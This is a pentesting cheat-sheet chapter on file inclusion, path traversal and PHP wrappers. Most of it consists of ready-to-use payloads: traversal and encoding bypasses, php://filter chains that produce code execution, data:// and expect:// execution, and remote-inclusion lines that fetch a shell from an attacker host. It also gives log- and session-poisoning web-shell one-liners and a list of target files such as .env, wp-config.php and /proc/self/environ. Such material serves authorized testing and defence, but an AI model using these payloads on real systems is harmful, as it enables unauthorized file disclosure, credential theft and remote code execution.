# Ch07 — File Inclusion, Path Traversal & PHP Wrappers

> LFI/RFI traversal payloads, null-byte/encoding/truncation bypasses, PHP wrapper arsenal, LFI→RCE escalation paths.
> Sources: `File Inclusion/` (README, Wrappers.md, LFI-to-RCE.md), `Directory Traversal/`, `Client Side Path Traversal/`.

**Route here when**: a parameter feeds `include()`/`require()`/file-read (`?page=`, `?file=`, `?template=`, `?path=`, download/log viewers) — or a client-side router builds fetch URLs from user input.

**Distinction**: path traversal = *read* a file the app serves/reads; file inclusion = file content *executes* (PHP include family). Traversal payloads work for both; wrappers/LFI→RCE are inclusion-specific.

**Safety**: read `/etc/hostname`, `win.ini`, or app config you were given. Don't read private keys/user files on shared targets — a directory listing proves the same impact.

## Traversal basics

```ps1
?page=../../../etc/passwd
?page=../../../../../../../../../../etc/passwd
?page=../../../../../../../../../../windows/win.ini
?page=..\..\..\..\..\..\windows\win.ini        // Windows backslash
```

Depth: try up to ~15 `../` — more is harmless (can't traverse above root).

## Bypass families (when `../` is stripped/blocked)

```ps1
?page=....//....//etc/passwd                   // '..' + '//' — strips one layer, reforms traversal
?page=..///////..////..//////etc/passwd        // mixed slashes
?page=/%5C../%5C../%5C../etc/passwd            // %5C backslash variants
?page=%252e%252e%252fetc%252fpasswd            // double URL-encode
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd     // overlong UTF-8 for '.'
?page=..%2f..%2fetc%2fpasswd                   // partial-encode
?page=....\/....\/etc/passwd                   // mixed separators
?page=../../../etc/passwd%00                   // null byte (PHP<5.3.4)
?page=../../../etc/passwd%2500                 // double-encoded null
```

**Path truncation** (when a suffix like `.php` is appended): push the filename past the 4096-byte limit so the suffix drops:

```ps1
?page=../../../etc/passwd............[PAD]
?page=../../../etc/passwd/./././././.[PAD]
?page=../../../[PAD]../../../../etc/passwd
```

**Interesting target files** (once traversal works):

| Goal | Files |
|---|---|
| OS id | `/etc/passwd`, `/etc/hostname`, `/proc/version`, `C:\windows\win.ini`, `C:\boot.ini` |
| App config | `../../config.php`, `wp-config.php`, `config/database.yml`, `WEB-INF/web.xml`, `appsettings.json`, `.env` files |
| Source code | `index.php` (via filter wrapper below — raw include executes instead of reading) |
| Sessions | `/var/lib/php/sessions/sess_<PHPSESSID>`, `/tmp/sess_*` |
| Logs | `/var/log/apache2/access.log`, `error.log`, `nginx/access.log`, `/proc/self/fd/N` |
| Proc | `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/fd/0..20` |

## PHP wrapper arsenal (when the param reaches `include`/`file_get_contents`)

```ps1
?page=php://filter/convert.base64-encode/resource=index.php   // READ source instead of executing — the #1 LFI payload
?page=php://filter/read=string.rot13/resource=index.php       // obfuscation variant
?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
?page=pHp://FilTer/convert.base64-encode/resource=index.php   // case-sensitive filter evasion
?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd   // compress+encode big files
```

Chain filters with `|` or `/` (`php://filter/A|B|C/resource=x`). The **php_filter_chain** technique (synacktiv) chains iconv/base64 filters so the include *generates arbitrary PHP* → RCE without any file write:

```ps1
?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
```

Generate with `php_filter_chain_generator.py --chain '<?php phpinfo();?>'`.

```ps1
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+   // data:// with encoded <?php phpinfo();?> — RCE when allow_url_include=On
?page=expect://id                                            // expect:// = direct cmd exec (rare, needs ext)
?page=php://input%00                                          // + raw PHP in request body → executes it
?page=zip://shell.jpg%23payload.php                           // read file inside uploaded zip (# = /)
?page=phar://archive.jpg/test.txt                             // phar:// — also triggers unserialize (see ch10)
?page=phar:///path/to/uploaded.phar                           // phar deserialization gadget path
```

## Remote File Inclusion

```ps1
?page=http://YOUR-HOST/shell.txt              // needs allow_url_include=On (off by default since PHP5)
?page=http://YOUR-HOST/shell.txt%00
?page=http:%252f%252fYOUR-HOST%252fshell.txt  // double-encode
?page=\\YOUR-HOST\share\shell.php             // Windows SMB — works even with allow_url_include=Off
```

## LFI → RCE escalation ladder (ordered)

1. **Filter chain RCE** — php_filter_chain above; no file write needed. Try first.
2. **`php://input`** — body holds `<?php ...; ?>`, include executes it. Needs `allow_url_include`.
3. **PEARcmd** — PHP image with pecl/pear installed: `?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/patt.php` → writes a php file, then include it.
4. **Log poisoning** — send request with `<?php system($_GET['c']); ?>` in User-Agent/URI → include `/var/log/apache2/access.log` or `/proc/self/fd/N`. Nginx/Apache/SMTP/SSH logs all work (`?file=/var/log/auth.log` after `ssh '<?php system($_GET[c]); ?>'@host` attempt).
5. **PHP session files** — set a session var containing PHP code (`?login=<?php system($_GET[c]);?>`) → include `/var/lib/php/sessions/sess_<ID>` or `/tmp/sess_<ID>`.
6. **`/proc/self/environ`** — inject PHP into env via header/User-Agent → include `/proc/self/environ`.
7. **Upload race / phpinfo()** — `PHP_SESSION_UPLOAD_PROGRESS` makes PHP write a tmp file; race to include it (`phpinfo()` leaks the tmp path). FindFirstFile variant on Windows.
8. **Iconv/dechunk variants** — older CVE-class tricks for specific PHP builds.

## Client-side path traversal (CSPT)

Front-end routers/fetches that concatenate user input into a URL — same traversal logic, no server include needed:

```ps1
https://app/#!/../../internal-api/admin
?returnUrl=..%2f..%2fapi%2fusers
```

Signal: browser issues a same-origin request to an unintended path — pairs with IDOR/CSRF (ch12/ch15) or leaks of authenticated API responses into DOM sinks.
